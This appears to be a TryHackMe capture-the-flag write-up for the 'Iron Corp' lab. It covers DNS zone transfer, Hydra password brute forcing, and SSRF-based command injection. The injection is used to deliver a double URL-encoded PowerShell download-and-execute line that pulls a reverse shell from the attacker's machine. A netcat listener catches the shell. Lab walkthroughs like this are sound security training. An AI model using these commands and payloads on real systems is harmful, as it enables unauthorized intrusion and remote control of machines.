# [Iron Corp](https://tryhackme.com/room/ironcorp)

## Can you get access to Iron Corp's system?

# Iron Corp

### user.txt

1. Add the target IP to the hosts file for proper domain resolution

```bash
sudo echo "IP ironcorp.me" >> /etc/hosts
```

2. Perform port scan to identify running services
   - **Results:** The scan reveals services running on multiple ports, including web services on port 11025.

```bash
nmap -p- -sV ironcorp.me
```

<img width="724" height="290" alt="SCREEN01" src="https://github.com/user-attachments/assets/c60fd6b3-31d9-432c-8f92-6e6a28da2547" />

3. Attempt a DNS zone transfer to discover additional subdomains
   - **Results:** The zone transfer reveals two additional subdomains: `admin.ironcorp.me` and `internal.ironcorp.me`.

```bash
dig axfr @ironcorp.me ironcorp.me
```

<img width="726" height="294" alt="SCREEN02" src="https://github.com/user-attachments/assets/5aa37ca0-b8bc-4dcf-a9b7-4be76c81b70f" />

4. Add the discovered subdomains to the hosts file

```bash
sudo sh -c 'echo "IP admin.ironcorp.me" >> /etc/hosts && echo "IP internal.ironcorp.me" >> /etc/hosts'
```

5. The admin panel at `http://admin.ironcorp.me:11025/` requires HTTP Basic Authentication. Use Hydra to brute force the credentials
   - **Credentials found:** `admin:password123`

```bash
hydra -l admin -P /root/Tools/wordlists/rockyou.txt -s 11025 admin.ironcorp.me http-get
```

<img width="721" height="287" alt="SCREEN03" src="https://github.com/user-attachments/assets/5b34ada4-c1f4-4a34-8a0d-394fa2e68d22" />

6. After authenticating to the admin panel, test for SSRF vulnerabilities. The application accepts a parameter `r` that makes requests to internal services
   - Test command injection through SSRF: `http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=test|whoami`
   - **Result:** Command execution confirmed - returns `nt authority\system`, indicating the web service runs with high privileges.

<img width="969" height="199" alt="SCREEN04" src="https://github.com/user-attachments/assets/b458a285-99fc-4287-af34-402b41babfa8" />

7. Set up a local HTTP server to host the PowerShell reverse shell payload

```bash
python -m SimpleHTTPServer
```

8. Set up a netcat listener to catch the reverse shell

```bash
nc -lvnp 4444
```

9. Download and modify a PowerShell reverse shell script from: [github.com/vulware/powershell-reverse-shell-](https://github.com/vulware/powershell-reverse-shell-/blob/master/powershell%20tcp%20reverse%20shell.ps1)

   - Update the IP address and port in the script to match your attacking machine

10. The SSRF vulnerability requires double URL encoding to bypass filters. Encode the following PowerShell command:

```powershell
powershell.exe -c iex(new-object net.webclient).downloadstring('http://IP:8000/shell.ps1')
```

Using [CyberChef](https://gchq.github.io/CyberChef/), double URL encode the payload:

```
powershell%252Eexe%2520%252Dc%2520iex%2528new%252Dobject%2520net%252Ewebclient%2529%252Edownloadstring%2528%2527http%253A%252F%252F10%252E10%252E240%252E255%253A8000%252Fshell%252Eps1%2527%2529
```

<img width="1679" height="550" alt="SCREEN06" src="https://github.com/user-attachments/assets/64e23c12-bdbf-4fdf-9032-41cb4e4160a3" />

11. Execute the payload through the SSRF vulnerability: `http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=test|powershell%252Eexe%2520%252Dc%2520iex%2528new%252Dobject%2520net%252Ewebclient%2529%252Edownloadstring%2528%2527http%253A%252F%252F10%252E10%252E240%252E255%253A8000%252Fshell%252Eps1%2527%2529`

    - This should trigger the reverse shell connection to your netcat listener

12. Navigate to the user directory and retrieve the first flag

```bash
cd C:\Users
more Administrator\Desktop\user.txt
```

<img width="445" height="39" alt="SCREEN05" src="https://github.com/user-attachments/assets/39bc3eec-b8fa-4e02-9ef7-ede6119eca6f" />

---

### root.txt

1. Check access permissions for potential privilege escalation paths, and access the SuperAdmin directory to retrieve the root flag

```bash
get-acl c:\users\SuperAdmin | fl
type c:\users\superadmin\desktop\root.txt
```

<img width="722" height="289" alt="SCREEN07" src="https://github.com/user-attachments/assets/ff0640b0-2fe2-4b90-b285-d0c1ebcb0130" />
